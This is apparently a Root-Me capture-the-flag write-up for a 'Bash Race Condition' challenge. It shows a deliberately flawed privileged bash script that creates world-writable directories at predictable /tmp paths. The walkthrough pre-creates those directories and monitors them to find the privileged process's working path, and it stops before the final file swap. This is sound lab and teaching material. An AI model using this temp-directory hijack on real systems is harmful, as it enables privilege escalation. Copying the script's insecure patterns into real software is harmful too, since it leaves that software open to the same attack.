# Bash Race Condition

## Description

A self-claimed shell guru tried to list some good bash habits, but blatantly failed. He wrote this script as a privileged user and made basic mistakes. Find the bug(s) and get the flag.

## Source code

```bash
#!/bin/bash
 
# Let's learn some bash tips and tricks!  Yeah!
 
#PATH=$(/usr/bin/getconf PATH || /bin/kill $$)
PATH="/bin:/usr/bin"
 
lockfile="/tmp/app-script_ch22.lock"
exec 9>"$lockfile"
if ! flock -n 9
then    printf 'Only one running instance is allowed.\n';
        exit 1
fi
 
# See, you can pass a non-integer value to sleep!
sleep 0.314159265
 
# Create a temporary directory to avoid collision.
unset tmp TMPDIR
tmp="/tmp/$PPID/$$"
 
if [[ "$1" = "cleanup" ]] || [[ -e "$tmp" ]]
then  rm -rvf "$tmp"
      exit 1
fi
 
mkdir -p -m777 "${tmp}"
 
temp_dir=$(mktemp -d -p "$tmp" -u)
mkdir -m=777 "$temp_dir" || { trap 'rm -rf "$tmp"; rm -f "$lockfile"' EXIT TERM INT; exit 1; }
 
# Let's cleanup the previous mess.
# (by the way, always quote your variables.  Always.  ALWAYS!)
trap 'rm -rf "$tmp"; rm -f "$lockfile"' EXIT TERM INT
 
# How to make a awk(1) + ~grep(1) in the very same command?
v=$(awk '/pattern/{print $1}' <<< "$(ps ax)")
if [ "$v" = "foo" ] then printf 'Wut?!\n'; fi
 
# You can use the {1..n} builtin instead of seq(1).
for i in {95..100}
do
    # echo(1) sucks.  Use printf(1) instead.
    printf '%d\n' "$i" > "$temp_dir"/file."$i"
done
 
# With find(1) you can specify the size of a file you are looking for, thanks to
# the -size option.  In the next command, "-size 4c" matches 4-bytes files.
 
# Using + instead of \; is often more efficient, because we do not spawn a
# process per matched file.
find "$temp_dir" -type f -size 4c -exec cat {} +
 
# Cleanup the mess.  Use -print0 + xargs -0 to avoid separator tricks
find "$temp_dir" -type f -print0 | xargs -0 rm
 
# That's all for now, folks.
```

## Challenge connection information

| Key        | Value                                                                                                                                                                                                                                                                                                                                 |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Host       | challenge02.root-me.org                                                                                                                                                                                                                                                                                                               |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                                   |
| Port       | 2222                                                                                                                                                                                                                                                                                                                                  |
| SSH access | [ssh -p 2222 app-script-ch22@challenge02.root-me.org](ssh://app-script-ch22:app-script-ch22@challenge02.root-me.org:2222 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_2275&ssh=ssh://app-script-ch22:app-script-ch22@challenge02 "WebSSH") |
| Username   | app-script-ch22                                                                                                                                                                                                                                                                                                                       |
| Password   | app-script-ch22                                                                                                                                                                                                                                                                                                                       |
## Exploration

Script is doing some very odd things. It's using `/tmp/PPID/PID` directory to create files with digits, only 1 process can be spawned, it reads this randomly created files and then removes them.

Vulnerability here would be to arbitrary read, but it's only finding files with size of 4, reading them and lastly removes everything.

So first we need to detect PPID and PID.

But we are denied to list the files.
```bash
app-script-ch22@challenge02:~$ ls -lhA /tmp
ls: cannot open directory '/tmp': Permission denied
app-script-ch22@challenge02:~$ ls -lhAd /tmp
drwxrwx-wt 14 root root 420 Mar  6 09:12 /tmp
```

But we can write to directory.
```bash
app-script-ch22@challenge02:~$ echo test > /tmp/t
app-script-ch22@challenge02:~$ cat /tmp/t
test
```

If we can't list directories then let's check `ps` for processes that will get spawned.
The lack of processes means that we only see our processes, and can't see others.
```bash
app-script-ch22@challenge02:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
app-scr+ 15414  0.0  0.0  12240  6968 ?        S<s  08:39   0:00 /lib/systemd/systemd --user
app-scr+ 15428  0.0  0.0   4980  4056 pts/0    S<s+ 08:39   0:00 -bash
app-scr+ 15766  0.1  0.0   4980  4048 pts/1    S<s  08:45   0:00 -bash
app-scr+ 22513  0.0  0.0   5460  2720 pts/1    R<+  08:58   0:00 ps aux
app-script-ch22@challenge02:~$ cat /proc/mounts | grep /proc
proc /proc proc rw,nosuid,nodev,noexec,relatime,hidepid=2 0 0
systemd-1 /proc/sys/fs/binfmt_misc autofs rw,relatime,fd=43,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=14634 0 0
binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc rw,relatime 0 0
```

The `hidepid=2` option in `/proc` mount configuration means that:
- **Processes are hidden** from non-root users. 
- **Non-root users** can only see their own processes.
- Even the root user can only see processes owned by root or the user who runs the command.

Last option would be lock file. The lock file (`/tmp/app-script_ch22.lock`) is typically used to ensure that only one instance of a script or application runs at a time. Its contents are usually not complex, and it's just a marker for locking purposes. The contents could vary based on how the lock is implemented, but commonly, it will just contain a single value representing the process ID (PID) of the process that created the lock.

After messing around with running processes in background and trying to read `*.lock` file it was empty, so no PID....

Alternatively sleep happens after `*.lock` file is created and we could probably hijack the file and do something with it.

`tmux` is installed so you can run terminals side by side. As we can observe `app-script-ch22-cracked` created the lock file, we (normal user) have only read permission over it.
```bash
app-script-ch22@challenge02:~$ while true; do ls /tmp/app-script_ch22.lock -lh && cat /tmp/app-script_ch22.lock; done 2>&1 | grep -v 'No such'
-rw-r----- 1 app-script-ch22-cracked app-script-ch22 0 Mar  6 10:31 /tmp/app-script_ch22.lock

app-script-ch22@challenge02:~$ ./wrapper
100
```

Only read means that we can't really hijack it due to permissions.. Also it's empty file.

We can create the file beforehand, but then script can't remove this file. But we don't care because error happens at the end of script, so nothing to worry about (?). But on the other hand 2 processes still can't be ran together so why do we need it?
```bash
app-script-ch22@challenge02:~$ echo 1 > /tmp/app-script_ch22.lock
app-script-ch22@challenge02:~$ chmod 777 /tmp/app-script_ch22.lock
app-script-ch22@challenge02:~$ ./wrapper
100
rm: cannot remove '/tmp/app-script_ch22.lock': Operation not permitted
```

1 *potential* usage is to
1. Create lock file
2. Run binary
3. Remove lock file
4. Run binary

Next is to hijack the directory it's using and luckily for us the PPID stays the same across all the runs. Now let's create the directories around our PPID, because new process will have higher PPID.
```bash
(Terminal 1) app-script-ch22@challenge02:~$ echo $PPID
1753
(Terminal 1) app-script-ch22@challenge02:~$ mkdir -p /tmp/{1700..2500}
(Terminal 1) app-script-ch22@challenge02:~$ ls /tmp
ls: cannot open directory '/tmp': Permission denied
(Terminal 1) app-script-ch22@challenge02:~$ ls /tmp/1700 -alh
total 0
drwxr-x---   2 app-script-ch22 app-script-ch22  40 Mar 10 04:13 .
drwxrwx-wt 813 root            root            16K Mar 10 04:13 ..
(Terminal 1) app-script-ch22@challenge02:~$ ls /tmp/1701 -alh
total 0
drwxr-x---   2 app-script-ch22 app-script-ch22  40 Mar 10 04:13 .
drwxrwx-wt 813 root            root            16K Mar 10 04:13 ..
```

The script crashes and error says it can't use `/tmp/1756/*` because of permissions, so 1756 is the target PPID
```bash
(Terminal 2) app-script-ch22@challenge02:~$ ./wrapper
mkdir: cannot create directory '/tmp/1756/1859': Permission denied
mkdir: cannot create directory '/tmp/1756/1859/tmp.OxmXOJExm5': No such file or directory
(Terminal 2) app-script-ch22@challenge02:~$ ./wrapper
mkdir: cannot create directory '/tmp/1756/1875': Permission denied
mkdir: cannot create directory '/tmp/1756/1875/tmp.SzWybWNIYJ': No such file or directory
(Terminal 2) app-script-ch22@challenge02:~$ ./wrapper
mkdir: cannot create directory '/tmp/1756/1883': Permission denied
mkdir: cannot create directory '/tmp/1756/1883/tmp.WvIZnvLaSk': No such file or directory
```

```bash
(Terminal 1) app-script-ch22@challenge02:~$ chmod 777 /tmp/1756
(Terminal 1) app-script-ch22@challenge02:~$ watch -n 0.1 'find /tmp/1756 -ls | tee -a /dev/shm/ppid.log'

(Terminal 2) app-script-ch22@challenge02:~$ ./wrapper 
./wrapper 
./wrapper 
./wrapper 
./wrapper 

(Terminal 1) app-script-ch22@challenge02:~$ cat /dev/shm/ppid.log
      821      0 drwxrwxrwx   3 app-script-ch22-cracked app-script-ch22       60 Mar 10 04:20 /tmp/1756/5810
      822      0 drwxrwxrwx   2 app-script-ch22-cracked app-script-ch22      160 Mar 10 04:20 /tmp/1756/5810/tmp.ZAct4X8ss5
      828      4 -rw-r-----   1 app-script-ch22-cracked app-script-ch22        4 Mar 10 04:20 /tmp/1756/5810/tmp.ZAct4X8ss5/file.100
      827      4 -rw-r-----   1 app-script-ch22-cracked app-script-ch22        3 Mar 10 04:20 /tmp/1756/5810/tmp.ZAct4X8ss5/file.99
      826      4 -rw-r-----   1 app-script-ch22-cracked app-script-ch22        3 Mar 10 04:20 /tmp/1756/5810/tmp.ZAct4X8ss5/file.98
      825      4 -rw-r-----   1 app-script-ch22-cracked app-script-ch22        3 Mar 10 04:20 /tmp/1756/5810/tmp.ZAct4X8ss5/file.97
      824      4 -rw-r-----   1 app-script-ch22-cracked app-script-ch22        3 Mar 10 04:20 /tmp/1756/5810/tmp.ZAct4X8ss5/file.96
      823      4 -rw-r-----   1 app-script-ch22-cracked app-script-ch22        3 Mar 10 04:20 /tmp/1756/5810/tmp.ZAct4X8ss5/file.95
```

Directory structure it creates is like above, we have 777 permissions on PID directory and then tmp directory. This gives us permission to write and remove files. `file.*` can't be overwritten, but can be deleted, replaced (e.g. with `ln`) and read.

